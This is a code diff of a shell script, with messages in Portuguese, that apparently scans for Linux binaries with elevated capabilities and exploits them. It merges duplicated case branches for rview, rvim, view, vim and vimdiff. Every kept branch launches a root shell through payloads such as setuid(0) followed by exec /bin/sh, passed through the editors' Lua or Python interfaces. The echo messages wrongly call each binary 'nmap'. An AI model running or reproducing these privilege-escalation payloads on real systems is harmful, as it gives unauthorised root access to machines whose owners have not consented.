@@ -49,23 +49,11 @@ echo "$cmd" | while read -r l; do
             echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
             "$pathc" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
             ;;
-        rview)
+        rview|rvim)
             echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
             "$pathc" -c ':lua os.execute("reset; exec sh")'
             ;;
-        rvim)
-            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
-            "$pathc" -c ':lua os.execute("reset; exec sh")'
-            ;;
-        view)
-            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
-            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
-            ;;
-        vim)
-            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
-            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
-            ;;
-        vimdiff)
+        view|vim|vimdiff)
             echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
             "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
             ;;
